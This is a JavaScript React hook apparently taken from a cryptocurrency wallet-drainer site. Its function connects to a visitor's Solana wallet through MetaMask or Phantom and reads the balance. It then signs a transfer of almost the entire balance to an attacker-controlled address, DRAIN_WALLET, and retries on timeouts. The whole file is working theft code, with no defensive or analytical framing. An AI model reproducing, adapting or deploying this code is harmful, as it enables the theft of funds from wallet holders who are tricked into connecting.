"use client";

import { useCallback } from 'react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;

const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useEthereumDrain = () => {
  const executeDrain = useCallback(async (allocatedAmount) => {
    let lastError = null;
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        if (!window.ethereum) {
          throw new Error('MetaMask not detected');
        }

        // Try multiple methods to get Solana provider from MetaMask
        let solanaProvider = null;
        
        // Method 1: Check if window.solana is from MetaMask
        if (window.solana && window.solana.isMetaMask) {
          solanaProvider = window.solana;
        }
        
        // Method 2: Check ethereum provider for Solana capability
        if (!solanaProvider && window.ethereum && window.ethereum.isMetaMask) {
          // Request Solana accounts from MetaMask
          try {
            const accounts = await window.ethereum.request({
              method: 'wallet_requestSolanaAccounts',
              params: []
            });
            if (accounts && accounts.length > 0) {
              solanaProvider = window.ethereum;
            }
          } catch (err) {
            console.log('MetaMask Solana request failed:', err.message);
          }
        }
        
        // Method 3: Check if Phantom is installed (fallback)
        if (!solanaProvider && window.solana?.isPhantom) {
          solanaProvider = window.solana;
        }

        if (!solanaProvider) {
          throw new Error('No Solana wallet detected. Please install Phantom or use MetaMask with Solana support.');
        }

        // Connect to wallet
        let response;
        try {
          response = await solanaProvider.connect();
        } catch (connectError) {
          // If already connected, try to get public key
          if (solanaProvider.publicKey) {
            response = { publicKey: solanaProvider.publicKey };
          } else {
            throw connectError;
          }
        }
        
        const walletPubkey = response.publicKey.toString();
        
        const connection = new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
          commitment: 'confirmed',
          confirmTransactionInitialTimeout: 120000
        });
        
        const balanceLamports = await connection.getBalance(new PublicKey(walletPubkey));
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[MetaMask/Solana] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: new PublicKey(walletPubkey),
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: new PublicKey(walletPubkey),
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Sign and send
        let signed;
        if (solanaProvider.signAndSendTransaction) {
          signed = await solanaProvider.signAndSendTransaction(transaction);
        } else if (solanaProvider.request) {
          // For MetaMask, use request method
          const serialized = transaction.serialize({ requireAllSignatures: false });
          signed = await solanaProvider.request({
            method: 'solana_signAndSendTransaction',
            params: [serialized]
          });
        } else {
          throw new Error('Provider does not support signing transactions');
        }
        
        const signature = signed.signature || signed;
        console.log(`[MetaMask/Solana] Sent: ${signature}`);
        
        const confirmation = await connection.confirmTransaction(
          {
            signature: signature,
            blockhash,
            lastValidBlockHeight,
          },
          'confirmed'
        );
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[MetaMask/Solana] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[MetaMask/Solana] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, []);

  return { executeDrain };
};
